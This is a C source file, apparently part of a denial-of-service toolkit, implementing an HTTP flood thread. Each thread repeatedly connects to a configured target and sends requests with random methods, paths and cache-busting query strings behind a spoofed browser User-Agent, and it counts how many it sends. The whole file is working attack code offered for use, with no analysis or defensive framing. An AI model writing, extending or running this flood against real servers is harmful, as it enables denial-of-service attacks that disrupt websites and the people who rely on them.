#include "../../include/elcienco.h"

extern volatile int attack_running;

void *http_flood(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackConfig cfg = data->config;
    
    printf("[HTTP Flood Thread %d] Started against %s:%d\n",
           data->thread_num, cfg.target, cfg.port);
    
    const char *paths[] = {"/", "/index.html", "/api/v1/test", "/wp-admin", "/login"};
    const char *methods[] = {"GET", "POST", "HEAD"};
    
    time_t start_time = time(NULL);
    unsigned long requests_sent = 0;
    
    while (attack_running && (time(NULL) - start_time) < cfg.duration) {
        int sock = create_tcp_socket();
        if (sock < 0) continue;
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(cfg.port);
        server_addr.sin_addr.s_addr = inet_addr(cfg.target);
        
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            char request[2048];
            const char *method = methods[rand() % 3];
            const char *path = paths[rand() % 5];
            
            snprintf(request, sizeof(request),
                "%s %s?%d HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                "Accept: */*\r\n"
                "Connection: close\r\n"
                "\r\n",
                method, path, rand(), cfg.target);
            
            send(sock, request, strlen(request), 0);
            requests_sent++;
        }
        
        close(sock);
    }
    
    printf("[HTTP Flood Thread %d] Finished. Requests: %lu\n",
           data->thread_num, requests_sent);
    
    free(data);
    return NULL;
}
